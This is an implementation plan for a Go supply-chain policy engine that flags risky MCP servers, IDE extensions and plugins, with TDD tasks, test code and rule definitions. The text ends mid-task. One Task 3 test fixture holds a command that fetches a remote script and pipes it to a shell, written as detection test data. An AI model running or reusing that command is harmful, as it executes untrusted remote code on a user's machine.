# Program C — Local Policy Engine ([NOW] slice)

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

> **Implemented decisions (2026-08-09):** The controller decisions in
> `.superpowers/sdd/2026-08-09-program-c/progress.md` supersede the unresolved
> alternatives retained at the end of this original plan. In particular, a
> local document cannot configure retention, policy tables live in `state.db`,
> the ladder classifier lives in `internal/inventory`, and policy violation
> exit code is 3.

**Goal:** Ship the `[NOW]` half of the policy layer: a pure `internal/policy` engine with the five-level precedence structure (levels 1–3 present and inert), three rule families (shape, change, pin), user exceptions with structural refusal of the four prohibited forms, trust-on-first-use pins, `policy init` / `policy pin` / `policy check`, a `POLICY` section in the hook, and an audit store that rides the existing `internal/store` discipline. Nothing about policy enters `ssc-init.scan.v3`, the snapshot payload, or the scan JSON.

**Architecture:** `internal/policy` is a pure package: it parses an `ssc-init.policy.v1` JSON document, takes `(model.Inventory, model.Delta)` plus pins and exceptions as values, and returns a `policy.Result`. It performs no filesystem access, executes no process, and opens no socket during evaluation. The ladder classifier moves out of `internal/report` into `internal/inventory` so both the renderer and the engine read one classification — `internal/report` imports `internal/policy` to render, so `internal/policy` must never import `internal/report`. Pins, exceptions, and decisions live in three new tables in the existing `state.db`, keyed by asset ID with no `scan_id` and no foreign key, exactly as `asset_history` already is (migration 6). `internal/cli` gains `policy init|pin|check`; `cmd/ssc-init` wires the store and the policy document path.

**Tech Stack:** Go 1.26 standard library only (`encoding/json`, `//go:embed`, `time`, `database/sql` through the already-vendored `modernc.org/sqlite`). No new module. No YAML, no TOML, no schema library, no regex-based rule matching.

**Authority:**
- `docs/superpowers/specs/2026-08-08-policy-layer-design.md` — approved, and the direct authority for every task here.
- `docs/superpowers/specs/2026-08-05-ssc-init-design.md` §8 (organization policy, precedence, outbound-finding exclusions), §9.1 (enforcement and host capability), §9.3 (exception scopes, expiry, prohibitions), §9.4 (remediation), §10 (retention), §5.2 (module 7: the local store holds decisions, exceptions, and audit history), §5.3 (**a single state database**).

## Scope: the `[NOW]` slice only

The policy design marks every element `[NOW]`, `[BUNDLE]`, `[TI]`, or `[HOST]`. This plan builds **only `[NOW]`**. That is not a reduced design — it is the honest subset, and the parts that are not buildable are **present and inert**, never designed out:

| Level | Name | This program | Behaviour today |
|---|---|---|---|
| 1 | Known malicious evidence | present, inert | evaluates to `no evidence available` — the TI index is an empty implementation, and the code path that would consult it is written and tested against a fake index |
| 2 | Organization deny | present, inert | evaluates to `no bundle present` — a local file cannot express it, and letting it try would make the precedence a lie |
| 3 | Organization allow | present, inert | evaluates to `no bundle present`; its hash-invalidation mechanic **is** built, as `pin-mismatch` |
| 4 | Time- and scope-bound user exceptions | **built** | loaded from the policy document, expiry evaluated at decision time |
| 5 | Default product policy | **built** | shipped rules present with `enabled: false` |

`policy check` **states which levels are active and which are inert, with the reason**, on every run. An unsigned local-only setup must never look like it is enforcing organization policy.

Also out of scope, permanently or for now:

- **Content inspection.** No rule may test what code *does*. A rule tests only facts this build established: identity, type, name, version, host, MCP `command`/`args`/`env_keys`/`transport`/`url_shape`, evidence status, ladder rung, digest. `[TI]`.
- **Behavioral rule family.** `[TI]`.
- **Bundle verification, staging, activation, rollback** (`internal/policy/bundle`). `[BUNDLE]`.
- **Any form of blocking, quarantine, or pre-execution interception.** `[HOST]`. The build's honest capability is `advisory` plus `on-demand`, and `policy check` reports exactly that string. `ssc-init policy check` exiting nonzero gates a *pipeline*; it is not pre-execution blocking and no output may describe it as such.
- **SARIF / CycloneDX / Finding JSON / webhooks.** `[BUNDLE]` (foundation §8 organization reporting).

## Global constraints (release-blocking)

- **No new runtime dependency.** `go.mod` must be unchanged by this program.
- **No scan-contract change.** `ssc-init.scan.v3`, the snapshot payload, and `ssc-init.status.v3` gain no policy field. A scan run with a policy document present and a scan run without one must produce byte-identical report JSON. Task 13 asserts this.
- **No policy state in the inventory snapshot.** Policy rows carry no `scan_id`, are not written by `SaveScan`, and are not pruned by snapshot retention.
- **A violation names the rule and the asset, never the matched value.** No digest, no path, no metadata value, no environment-variable value ever appears in a violation, a hook line, or a `policy check` payload. This is foundation §8's outbound-exclusion list restated for a local surface, and it is release-blocking.
- **Evaluation is pure.** `policy.Evaluate` takes values and returns values. A test asserts the package's non-test sources contain no `os.`, `exec.`, or `net.` reference (the same audit `internal/acceptance` already runs over collectors).
- **Default scans still execute no process and perform no network access.**
- **Deterministic output.** Same document + same snapshot + same pins/exceptions ⇒ byte-identical `policy check` JSON and byte-identical hook text.
- Persist no absolute path, no secret, no raw content in any policy table. Store validation rejects them the same way it rejects them in a snapshot.

## Concurrency with Programs A and B

Other agents are actively writing `internal/cli`, `cmd/ssc-init`, and `internal/install`. Tasks 1–8 touch none of those. Tasks 9–13 do. Execute this program on its own branch in its own worktree, and **rebase onto the landed Program A/B CLI work before starting Task 9**. If `internal/cli/options.go` has grown a subcommand parser by then, extend it rather than reinstating the flat `switch`.

Conventions (every task): strict TDD — write the named failing test, run it, see the stated failure, implement the minimum, run the focused package, then the stated regression set. After GREEN run `go vet ./...`, `gofmt -l` on touched directories, `git diff --check`. Commit messages end with the trailer `Claude-Session: https://claude.ai/code/session_01YCnH78bwuqahh8qmL5wpu6`. Never `git add -A`; add the named paths. `go test ./scripts` needs a clean tree — run it only after committing.

---

### Task 1: The `ssc-init.policy.v1` document and its parser

**Files:**
- Create: `internal/policy/document.go`
- Create: `internal/policy/parse.go`
- Create: `internal/policy/parse_test.go`

The document is JSON because Go's standard library parses JSON and the project is already all-JSON; a YAML or TOML reader would be a new runtime dependency, which is release-blocking. The `[BUNDLE]` pipeline authors YAML and compiles to exactly this shape, so YAML never reaches a client.

Three parsing decisions that are not negotiable:

1. **Unknown fields are a load error.** A typo'd match field that parses to a silently inert rule is worse than a refusal: the reader believes a rule is protecting them and it is not.
2. **Duplicate JSON object keys are a load error.** `encoding/json` silently keeps the last one, so `"enabled": true, "enabled": false` would load as disabled with no signal. Foundation §8 requires duplicate-key validation; CI does it before signing a bundle, and the client does it for a local file.
3. **Errors name a location and a reason, never a value.** `rules[2].family: unknown rule family` — not the offending string. The store's validation errors already hold this line.

- [ ] **Step 1: Write the failing test**

Create `internal/policy/parse_test.go`:

```go
package policy_test

import (
	"strings"
	"testing"

	"github.com/s1ns3nz0/ssc-init/internal/policy"
)

func TestLoadAcceptsTheDocumentedShape(t *testing.T) {
	document, err := policy.Load([]byte(`{
  "schemaVersion": "ssc-init.policy.v1",
  "rules": [
    {
      "id": "mcp-shell-command",
      "family": "shape",
      "enabled": true,
      "description": "An MCP server whose command is a shell.",
      "match": {"assetType": ["mcp-server"], "metadataEquals": {"command": ["sh", "bash", "zsh"]}}
    }
  ]
}`))
	if err != nil {
		t.Fatalf("documented document rejected: %v", err)
	}
	if len(document.Rules) != 1 || document.Rules[0].ID != "mcp-shell-command" || !document.Rules[0].Enabled {
		t.Fatalf("document did not round-trip: %+v", document.Rules)
	}
}

func TestLoadRejectsUnknownFieldsAndDuplicateKeys(t *testing.T) {
	for name, source := range map[string]string{
		"unknown document field": `{"schemaVersion":"ssc-init.policy.v1","ruls":[]}`,
		"unknown rule field":     `{"schemaVersion":"ssc-init.policy.v1","rules":[{"id":"a","family":"shape","enabled":false,"description":"d","sevrity":"high"}]}`,
		"unknown match field":    `{"schemaVersion":"ssc-init.policy.v1","rules":[{"id":"a","family":"shape","enabled":false,"description":"d","match":{"assetKind":["mcp-server"]}}]}`,
		"duplicate key":          `{"schemaVersion":"ssc-init.policy.v1","rules":[{"id":"a","family":"shape","enabled":true,"enabled":false,"description":"d","match":{"assetType":["mcp-server"]}}]}`,
		"duplicate rule id":      `{"schemaVersion":"ssc-init.policy.v1","rules":[{"id":"a","family":"shape","enabled":false,"description":"d","match":{"assetType":["mcp-server"]}},{"id":"a","family":"change","enabled":false,"description":"d","match":{"rungs":["NEW"]}}]}`,
		"unknown family":         `{"schemaVersion":"ssc-init.policy.v1","rules":[{"id":"a","family":"behavioral","enabled":false,"description":"d"}]}`,
		"wrong schema version":   `{"schemaVersion":"ssc-init.policy.v2","rules":[]}`,
		"missing description":    `{"schemaVersion":"ssc-init.policy.v1","rules":[{"id":"a","family":"shape","enabled":false,"match":{"assetType":["mcp-server"]}}]}`,
		"invalid rule id":        `{"schemaVersion":"ssc-init.policy.v1","rules":[{"id":"A Rule","family":"shape","enabled":false,"description":"d","match":{"assetType":["mcp-server"]}}]}`,
	} {
		if _, err := policy.Load([]byte(source)); err == nil {
			t.Fatalf("%s: Load accepted an invalid document", name)
		}
	}
}

func TestLoadErrorsNameALocationAndNeverAValue(t *testing.T) {
	_, err := policy.Load([]byte(`{"schemaVersion":"ssc-init.policy.v1","rules":[
		{"id":"a","family":"shape","enabled":false,"description":"d","match":{"assetType":["mcp-server"]}},
		{"id":"b","family":"nonsense","enabled":false,"description":"d"}]}`))
	if err == nil {
		t.Fatal("Load accepted an unknown family")
	}
	if !strings.Contains(err.Error(), "rules[1].family") {
		t.Fatalf("error does not locate the fault: %v", err)
	}
	if strings.Contains(err.Error(), "nonsense") {
		t.Fatalf("error echoed the offending value: %v", err)
	}
}
```

- [ ] **Step 2: Run it to verify it fails**

Run: `go test ./internal/policy -count=1`

Expected: FAIL — `no required module provides package .../internal/policy` (the package does not exist), then once the files exist, `undefined: policy.Load`.

- [ ] **Step 3: Implement**

`internal/policy/document.go` holds the data model and the closed vocabularies:

```go
// Package policy evaluates a local policy document against an inventory
// snapshot. Evaluation is pure: it reads no file, starts no process, and opens
// no socket. Loading a document is the only I/O the package's callers perform,
// and they perform it, not this package.
package policy

// SchemaVersion is the only document version this build accepts.
const SchemaVersion = "ssc-init.policy.v1"

// Family is the closed set of rule families. Behavioral rules require
// analyzers that do not exist (design §3, [TI]); the family is deliberately
// absent rather than accepted-and-ignored, so a document written against a
// later build fails loudly here instead of silently protecting nothing.
type Family string

const (
	FamilyShape  Family = "shape"
	FamilyChange Family = "change"
	FamilyPin    Family = "pin"
)

// Document is a parsed ssc-init.policy.v1 file.
type Document struct {
	SchemaVersion string      `json:"schemaVersion"`
	Rules         []Rule      `json:"rules"`
	Exceptions    []Exception `json:"exceptions,omitempty"`
}

// Rule is one policy rule. A disabled rule is still parsed and still reported
// by policy check: level 5 ships every rule disabled, and a reader must be able
// to see what is available without editing anything.
type Rule struct {
	ID          string `json:"id"`
	Family      Family `json:"family"`
	Enabled     bool   `json:"enabled"`
	Description string `json:"description"`
	Match       *Match `json:"match,omitempty"`
}

// Match is the closed set of facts a rule may test. Every field is a set of
// exact values except MetadataContains, and an empty string in a set matches
// an absent or empty fact — so ["latest", ""] covers both mutable forms design
// §6.3 names. There is deliberately no regular expression: a user-supplied
// pattern is an evaluation-time risk surface, and exact sets plus substrings
// express every rule this build has facts for.
type Match struct {
	AssetType        []string            `json:"assetType,omitempty"`
	AssetName        []string            `json:"assetName,omitempty"`
	AssetVersion     []string            `json:"assetVersion,omitempty"`
	Host             []string            `json:"host,omitempty"`
	ObservationSource []string           `json:"observationSource,omitempty"`
	MetadataEquals   map[string][]string `json:"metadataEquals,omitempty"`
	MetadataContains map[string][]string `json:"metadataContains,omitempty"`
	EvidenceStatus   []string            `json:"evidenceStatus,omitempty"`
	Rungs            []string            `json:"rungs,omitempty"`
}
```

`internal/policy/parse.go` implements `Load([]byte) (Document, error)`:

- `json.NewDecoder(bytes.NewReader(source))` with `DisallowUnknownFields()`, decoded into `Document`, then `decoder.More()` must be false (trailing content is an error).
- A separate `assertNoDuplicateKeys` pass over `json.NewDecoder(...).Token()` walks the token stream, tracking a `map[string]struct{}` per object depth, and returns `fmt.Errorf("%s: duplicate object key", location)` where `location` is the dotted/indexed path built during the walk. Never include the key itself.
- Validate: `SchemaVersion == SchemaVersion` else `errors.New("schemaVersion: unsupported policy schema version")`; each rule's `ID` matches `\A[a-z][a-z0-9-]{0,31}\z`; each `Family` is one of the three; `Description` non-empty; `Match` required for `shape` and `change`, and **forbidden** for `pin` (a pin rule matches by the presence or absence of a pin, not by facts); `Rungs` only on `change`; change rules may use the other shape fields to narrow matching rows; `Rungs` values ∈ `{NEW, CHANGED, UPGRADED, REMOVED, UNVERIFIED}`; `EvidenceStatus` values ∈ the `model.EvidenceStatus` vocabulary; `AssetType` values ∈ the `model.AssetType` vocabulary; rule IDs unique.
- Every error is `fmt.Errorf("rules[%d].%s: %s", index, field, reason)`.

Keep `Exception` as a declared-but-unvalidated type for now — Task 7 owns it. Local level-5 documents deliberately have no retention field: foundation §10 reserves retention configuration for signed organization policy `[BUNDLE]`.

- [ ] **Step 4: Run it to verify it passes**

Run: `go test ./internal/policy -count=1 && go vet ./internal/policy`

Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add internal/policy
git commit -m "feat: parse the ssc-init.policy.v1 document"
```

---

### Task 2: The five-level precedence structure, with 1–3 present and inert

**Files:**
- Create: `internal/policy/precedence.go`
- Create: `internal/policy/precedence_test.go`

Levels 1–3 exist in the engine from day one and evaluate to *no evidence available* / *no bundle present*. They are not designed out and added back later: they are present, ordered, and reported, so nothing above them can be silently reordered when the TI manager and the bundle pipeline arrive. A level's inertness is a **stated reason**, not an absence.

Level 1 consults a `MaliciousIndex` interface whose only production implementation reports "no evidence available". That interface is the seam `[TI]` fills, and Task 7 uses a fake implementation of it to test a refusal that cannot otherwise fire today.

- [ ] **Step 1: Write the failing test**

```go
func TestPrecedenceLevelsAreAllPresentAndOrdered(t *testing.T) {
	levels := policy.Levels(policy.Sources{})
	if len(levels) != 5 {
		t.Fatalf("got %d precedence levels, want 5", len(levels))
	}
	want := []struct {
		number int
		name   string
		active bool
		reason string
	}{
		{1, "known-malicious-evidence", false, "no evidence available"},
		{2, "organization-deny", false, "no bundle present"},
		{3, "organization-allow", false, "no bundle present"},
		{4, "user-exceptions", true, ""},
		{5, "default-product-policy", true, ""},
	}
	for index, expected := range want {
		got := levels[index]
		if got.Number != expected.number || got.Name != expected.name ||
			got.Active != expected.active || got.Reason != expected.reason {
			t.Fatalf("level %d: got %+v, want %+v", index+1, got, expected)
		}
	}
}

func TestKnownMaliciousLevelIsInertWithoutIntelligence(t *testing.T) {
	decided, reason := policy.KnownMalicious(policy.Sources{}, "agent-plugin:claude:helpful-utils@1.0.0", "sha256:00")
	if decided {
		t.Fatal("level 1 decided without any intelligence")
	}
	if reason != "no evidence available" {
		t.Fatalf("level 1 reason = %q, want %q", reason, "no evidence available")
	}
}
```

- [ ] **Step 2: Run it to verify it fails**

Run: `go test ./internal/policy -run 'Precedence|KnownMalicious' -count=1`

Expected: FAIL — `undefined: policy.Levels`.

- [ ] **Step 3: Implement**

```go
// Level is one precedence level (design §8, policy design §1). Every level is
// present in every build. A level this build cannot evaluate is reported
// inactive with the reason it is inactive, so an unsigned local-only setup
// never looks like it is enforcing organization policy.
type Level struct {
	Number int    `json:"level"`
	Name   string `json:"name"`
	Active bool   `json:"active"`
	Reason string `json:"reason,omitempty"`
}

// MaliciousIndex answers whether an artifact has known-malicious intelligence.
// The only implementation in this build is emptyIndex, which always answers
// "no evidence available": the TI manager does not exist yet ([TI]). The
// interface exists so level 1 is a real code path rather than a comment.
type MaliciousIndex interface {
	KnownMalicious(assetID, digest string) bool
}

// Sources carries what the caller managed to load. A nil member means that
// source is absent, which is the normal local-only case — not an error.
type Sources struct {
	Intelligence MaliciousIndex // nil ⇒ level 1 inert
	Bundle       *Bundle        // always nil in this build ⇒ levels 2 and 3 inert
	Document     Document       // level 4 exceptions and level 5 rules
}

// Bundle is the signed organization policy bundle. It is declared and never
// constructed: internal/policy/bundle is [BUNDLE] work. Declaring it keeps
// levels 2 and 3 typed rather than hypothetical.
type Bundle struct{ _ struct{} }
```

`Levels(Sources) []Level` returns the five entries with `Active` and `Reason` derived from which sources are present. `KnownMalicious(Sources, assetID, digest) (bool, string)` returns `(false, "no evidence available")` when `Intelligence` is nil, and otherwise delegates.

A local file **cannot** set `Bundle`. There is no code path from `Load` to a non-nil `Bundle`, and a test asserts it: a document is not allowed to claim organization authority.

- [ ] **Step 4: Run it to verify it passes**

Run: `go test ./internal/policy -count=1`

- [ ] **Step 5: Commit**

```bash
git add internal/policy
git commit -m "feat: carry all five precedence levels, three of them inert"
```

---

### Task 3: Shape rules

**Files:**
- Create: `internal/policy/shape.go`
- Create: `internal/policy/evaluate.go`
- Create: `internal/policy/shape_test.go`

Shape rules test recorded asset and observation facts. The two rules foundation §6.3 names explicitly — `latest`/unspecified versions and mutable branches, and direct remote-script execution — are expressible from these facts today. MCP observation metadata keys are already established by `internal/collector/mcp`: `transport`, `command`, `args` (unit-separator joined), `env_keys`, `header_keys`, `url_shape`, `cwd_ref`, `enabled`, `enabled_tools`, `disabled_tools`, `unknown_fields`, `source_target`.

A rule is evaluated per `(asset, observation)` pair, plus once per asset with no observation, so an asset-only rule still fires. The violation carries the rule ID, the asset ID, and the display columns — **never the matched value**.

- [ ] **Step 1: Write the failing test**

```go
func TestShapeRuleMatchesRecordedMCPFacts(t *testing.T) {
	inventory := model.Inventory{
		Assets: []model.Asset{
			{ID: "mcp:claude-code:helpful-utils", Type: model.AssetMCP, Name: "helpful-utils", Source: "claude-code"},
			{ID: "mcp:claude-code:safe", Type: model.AssetMCP, Name: "safe", Source: "claude-code"},
		},
		Observations: []model.Observation{
			{ID: "obs-1", AssetID: "mcp:claude-code:helpful-utils", Collector: "mcp", Host: "claude-code",
				Metadata: map[string]string{"command": "sh", "args": "-c\x1fcurl https://example.invalid/i.sh | sh"}},
			{ID: "obs-2", AssetID: "mcp:claude-code:safe", Collector: "mcp", Host: "claude-code",
				Metadata: map[string]string{"command": "node", "args": "server.js"}},
		},
	}
	document, err := policy.Load([]byte(`{
  "schemaVersion": "ssc-init.policy.v1",
  "rules": [{
    "id": "mcp-shell-command",
    "family": "shape",
    "enabled": true,
    "description": "An MCP server whose command is a shell.",
    "match": {"assetType": ["mcp-server"], "metadataEquals": {"command": ["sh", "bash", "zsh"]}}
  }]
}`))
	if err != nil {
		t.Fatal(err)
	}
	result := policy.Evaluate(policy.Input{
		Sources:   policy.Sources{Document: document},
		Inventory: inventory,
	})
	if len(result.Violations) != 1 {
		t.Fatalf("got %d violations, want 1: %+v", len(result.Violations), result.Violations)
	}
	violation := result.Violations[0]
	if violation.RuleID != "mcp-shell-command" || violation.AssetID != "mcp:claude-code:helpful-utils" || violation.Level != 5 {
		t.Fatalf("unexpected violation: %+v", violation)
	}
}

func TestDisabledShapeRuleNeverFires(t *testing.T) {
	// Same document with "enabled": false must produce zero violations. A level
	// 5 rule is inert until adopted (policy design §3).
}

func TestViolationNeverCarriesTheMatchedValue(t *testing.T) {
	// Marshal the result to JSON and assert it contains neither "curl" nor
	// "example.invalid" nor the unit separator.
}
```

Write all three concretely.

- [ ] **Step 2: Run it to verify it fails**

Run: `go test ./internal/policy -run Shape -count=1`

Expected: FAIL — `undefined: policy.Evaluate`.

- [ ] **Step 3: Implement**

`evaluate.go` declares the evaluation boundary:

```go
// Input is everything Evaluate reads. It is all values: Evaluate opens no
// file, starts no process, and consults no clock beyond Now.
type Input struct {
	Sources    Sources
	Inventory  model.Inventory
	Delta      model.Delta
	Pins       []Pin
	Exceptions []Exception
	Now        time.Time
}

// Violation is one rule firing against one asset. It names the rule and the
// asset and nothing else: the matched value, the digest, and the path are all
// excluded, which is foundation §8's outbound-exclusion list applied to a
// local surface.
type Violation struct {
	RuleID    string `json:"ruleId"`
	Level     int    `json:"level"`
	AssetID   string `json:"assetId"`
	AssetType string `json:"assetType"`
	AssetName string `json:"assetName"`
	Host      string `json:"host,omitempty"`
	Standing  bool   `json:"standing"`
}

// Result is the whole answer: which levels decided, what violated, and which
// exceptions applied or expired.
type Result struct {
	Levels     []Level     `json:"levels"`
	Violations []Violation `json:"violations"`
	Applied    []Applied   `json:"exceptionsApplied,omitempty"`
	Expired    []Applied   `json:"exceptionsExpired,omitempty"`
}
```

`shape.go` implements `matchesShape(Match, model.Asset, *model.Observation) bool`: every non-empty field of `Match` must match (AND across fields, OR within a set). `MetadataContains` uses `strings.Contains` on the observation metadata value; `args` is additionally split on `\x1f` and each element tested, so `"| sh"` matches an argument without matching an argument that merely contains those bytes across a boundary. An empty string in a value set matches an absent key or an empty value.

Violations sort by `(RuleID, AssetID)` so output is deterministic.

- [ ] **Step 4: Run it to verify it passes**

Run: `go test ./internal/policy -count=1 && go test -race ./internal/policy -count=1`

- [ ] **Step 5: Commit**

```bash
git add internal/policy
git commit -m "feat: evaluate shape rules against recorded facts"
```

---

### Task 4: Move the severity-ladder classifier into `internal/inventory`

**Files:**
- Create: `internal/inventory/ladder.go`
- Create: `internal/inventory/ladder_test.go`
- Modify: `internal/report/rung.go`, `internal/report/rung_test.go`

Change rules match ladder rungs, so the engine needs the same classification the hook renders. `internal/report` must import `internal/policy` (Task 11 renders `policy.Result`), so `internal/policy` must not import `internal/report` — that would be an import cycle. The classifier therefore moves to the package that already computes the delta it classifies (`internal/inventory.Diff`), and both consumers read one implementation. Re-deriving the rungs inside `internal/policy` is not acceptable: the NEW/UPGRADED pairing rules in `classify` are subtle (one-to-one multiplicity, both endpoints versioned, added-asset records suppressed) and a second copy would drift.

**This task must not change one byte of output.** `classify` moves verbatim; only identifiers become exported.

- [ ] **Step 1: Write the failing test**

`internal/inventory/ladder_test.go` reproduces two existing `internal/report/rung_test.go` cases against the new API — one upgrade pairing and one UNVERIFIED-beats-CHANGED case — plus:

```go
func TestLadderRungOrderIsTheDocumentedSeverityOrder(t *testing.T) {
	want := []inventory.Rung{
		inventory.RungNew, inventory.RungChanged, inventory.RungUnverified,
		inventory.RungUpgraded, inventory.RungRemoved,
	}
	for index, rung := range want {
		if int(rung) != index {
			t.Fatalf("%s has ordinal %d, want %d", rung.Label(), int(rung), index)
		}
	}
	for _, label := range []string{"NEW", "CHANGED", "UNVERIFIED", "UPGRADED", "REMOVED"} {
		if _, ok := inventory.RungByLabel(label); !ok {
			t.Fatalf("documented rung label %q is not resolvable", label)
		}
	}
	if _, ok := inventory.RungByLabel("CRITICAL"); ok {
		t.Fatal("undocumented rung label accepted")
	}
}
```

- [ ] **Step 2: Run it to verify it fails**

Run: `go test ./internal/inventory -run Ladder -count=1`

Expected: FAIL — `undefined: inventory.Ladder`.

- [ ] **Step 3: Implement**

Move `rung`, `rungLabels`, `rungRow`, `versionedAssetTypes`, `digestSegment`, `unnamedAsset`, `assetTypeByIDPrefix`, `parseAssetID`, `displayFor`, `assetIdentity`, `assetChange`, and `classify` from `internal/report/rung.go` into `internal/inventory/ladder.go`, exported as `Rung`, `Rung.Label()`, `RungByLabel`, `Row`, and `Ladder(model.Inventory, model.Delta) []Row`. Keep every comment: they carry the reasoning behind the pairing rules.

`Row` keeps its unexported `key` field for the total order — export `Rung`, `Type`, `Name`, `Host`, `From`, `To` only, and add an exported `AssetID()` accessor so `internal/policy` can attribute a rung to an asset.

`internal/report/rung.go` shrinks to the renderer:

```go
// render returns the display line for one row, without the leading indent. It
// is the single format the hook ladder, the pretty ladder, and the POLICY
// section print; only the left column's label and width differ.
func render(label string, labelWidth int, row inventory.Row) string {
	line := fmt.Sprintf("%-*s %-13s %s", labelWidth, label, row.Type, row.Name)
	if row.Host != "" {
		line += fmt.Sprintf(" (%s)", row.Host)
	}
	if row.Rung == inventory.RungUpgraded && label == row.Rung.Label() {
		line += fmt.Sprintf("  %s → %s", row.From, row.To)
	}
	return line
}

func rungLine(row inventory.Row) string { return render(row.Rung.Label(), 10, row) }
```

`internal/report/rung_test.go` keeps every existing case, retargeted at the moved API.

- [ ] **Step 4: Run it to verify it passes**

Run: `go test ./internal/inventory ./internal/report ./internal/cli ./internal/acceptance -count=1`

Expected: PASS with **no golden file edited**. If a golden changes, the move was not verbatim — revert and redo it.

- [ ] **Step 5: Commit**

```bash
git add internal/inventory internal/report
git commit -m "refactor: move the severity ladder beside the delta it classifies"
```

---

### Task 5: Change rules

**Files:**
- Create: `internal/policy/change.go`
- Create: `internal/policy/change_test.go`
- Modify: `internal/policy/evaluate.go`

A change rule matches one or more ladder rungs, optionally narrowed by the shape fields. It answers "tell me when an IDE extension changes without a version bump", which shape rules cannot express because they see one snapshot.

- [ ] **Step 1: Write the failing test**

```go
func TestChangeRuleMatchesLadderRungs(t *testing.T) {
	document, err := policy.Load([]byte(`{
  "schemaVersion": "ssc-init.policy.v1",
  "rules": [{
    "id": "silent-extension-change",
    "family": "change",
    "enabled": true,
    "description": "An IDE extension whose bytes changed without a version change.",
    "match": {"assetType": ["ide-extension"], "rungs": ["CHANGED"]}
  }]
}`))
	if err != nil {
		t.Fatal(err)
	}
	inventory := model.Inventory{Assets: []model.Asset{
		{ID: "ide-extension:vscode:esbenp.prettier-vscode@11.0.0", Type: model.AssetIDEExtension, Name: "prettier-vscode", Source: "vscode"},
		{ID: "agent-plugin:claude:helpful-utils@1.0.0", Type: model.AssetAgentPlugin, Name: "helpful-utils", Source: "claude"},
	}}
	delta := model.Delta{Changes: []model.Change{
		{Kind: model.ChangeChanged, Entity: model.ChangeEntityAsset, EntityID: "ide-extension:vscode:esbenp.prettier-vscode@11.0.0"},
		{Kind: model.ChangeChanged, Entity: model.ChangeEntityAsset, EntityID: "agent-plugin:claude:helpful-utils@1.0.0"},
	}}
	result := policy.Evaluate(policy.Input{Sources: policy.Sources{Document: document}, Inventory: inventory, Delta: delta})
	if len(result.Violations) != 1 || result.Violations[0].AssetID != "ide-extension:vscode:esbenp.prettier-vscode@11.0.0" {
		t.Fatalf("unexpected violations: %+v", result.Violations)
	}
}

func TestChangeRuleAgainstAnEmptyDeltaFiresNothing(t *testing.T) {
	// A quiet machine has no rungs. A change rule must produce no violation,
	// and must not fall back to matching the whole inventory.
}
```

- [ ] **Step 2: Run it to verify it fails**

Run: `go test ./internal/policy -run Change -count=1`

Expected: FAIL — `got 2 violations, want 1` (the family is parsed but ignored), or `undefined` if `Evaluate` does not yet dispatch on family.

- [ ] **Step 3: Implement**

`Evaluate` calls `inventory.Ladder(input.Inventory, input.Delta)` once, keyed by asset ID, and change rules test `Rungs` membership plus the shape fields against the row's asset. A row whose asset is gone from the inventory (REMOVED) still yields a violation carrying the row's display columns.

- [ ] **Step 4: Run it to verify it passes**

Run: `go test ./internal/policy ./internal/inventory -count=1`

- [ ] **Step 5: Commit**

```bash
git add internal/policy
git commit -m "feat: evaluate change rules against the severity ladder"
```

---

### Task 6: `pin-mismatch` and `unpinned` as two independent rules

**Files:**
- Create: `internal/policy/pin.go`
- Create: `internal/policy/pin_test.go`

`pin-mismatch` — a pinned asset ID hashes differently than approved. Because the ID embeds the version, that means *same asset, same version, different bytes*: the tamper shape. It is also the mechanic behind precedence level 3, so building it now is building level 3's invalidation rule.

`unpinned` — an asset has trusted content evidence and no pin. A legitimate upgrade mints a new asset ID with no pin, so this fires on every install and upgrade until re-approved.

They stay **separate rules with separate `enabled` flags**. Merged, the noisy one buries the sharp one: a dozen `unpinned` lines after a routine update batch with the single `pin-mismatch` that matters somewhere inside.

Only `complete` evidence is a trusted digest. `partial`, `oversize`, `unavailable`, `skipped`, and `unsupported` evidence must never produce a `pin-mismatch` — a missing digest is a coverage gap, and reporting it as a mismatch would be the tool inventing a tamper claim out of its own failure.

- [ ] **Step 1: Write the failing test**

```go
func TestPinMismatchFiresOnlyOnCompleteEvidence(t *testing.T) {
	pins := []policy.Pin{{
		AssetID: "agent-plugin:claude:helpful-utils@1.0.0",
		Kind:    string(model.EvidenceTreeSHA256),
		Subject: model.EvidenceSubjectPayloadTree,
		Digest:  "1111111111111111111111111111111111111111111111111111111111111111",
	}}
	inventory := model.Inventory{
		Assets: []model.Asset{{ID: "agent-plugin:claude:helpful-utils@1.0.0", Type: model.AssetAgentPlugin, Name: "helpful-utils", Source: "claude"}},
		Evidence: []model.ContentEvidence{{
			ID: "ev-1", AssetID: "agent-plugin:claude:helpful-utils@1.0.0",
			Kind: model.EvidenceTreeSHA256, Subject: model.EvidenceSubjectPayloadTree,
			Status: model.EvidenceComplete, Algorithm: "sha256",
			Digest: "2222222222222222222222222222222222222222222222222222222222222222",
		}},
	}
	result := policy.Evaluate(policy.Input{Sources: policy.Sources{Document: pinDocument(t)}, Inventory: inventory, Pins: pins})
	if len(result.Violations) != 1 || result.Violations[0].RuleID != "pin-mismatch" {
		t.Fatalf("unexpected violations: %+v", result.Violations)
	}

	inventory.Evidence[0].Status = model.EvidenceUnavailable
	inventory.Evidence[0].Digest = ""
	result = policy.Evaluate(policy.Input{Sources: policy.Sources{Document: pinDocument(t)}, Inventory: inventory, Pins: pins})
	for _, violation := range result.Violations {
		if violation.RuleID == "pin-mismatch" {
			t.Fatal("pin-mismatch fired on evidence with no trusted digest")
		}
	}
}

func TestUnpinnedAndPinMismatchAreIndependentlyEnabled(t *testing.T) {
	// Document with unpinned enabled and pin-mismatch disabled: an asset with a
	// mismatching pin produces exactly zero violations, because its pin exists.
	// Document with pin-mismatch enabled and unpinned disabled: an asset with no
	// pin at all produces exactly zero violations.
}

func TestUnpinnedNeverFiresOnEvidenceWithNoTrustedDigest(t *testing.T) {
	// An asset whose only evidence is unsupported (package payloads, container
	// identity) is not "unpinned" — there is nothing a pin could record.
}
```

`pinDocument(t)` is a helper returning a document with both pin rules enabled.

- [ ] **Step 2: Run it to verify it fails**

Run: `go test ./internal/policy -run Pin -count=1`

Expected: FAIL — `undefined: policy.Pin`.

- [ ] **Step 3: Implement**

```go
// Pin is an approved digest for one asset's one evidence subject. A pin is
// trust on first use: it records whatever was on the machine when it was taken,
// so it protects against future change and never against what is already there.
type Pin struct {
	AssetID string
	Kind    string
	Subject string
	Digest  string
}
```

Pin evaluation keys on `(AssetID, Kind, Subject)`:
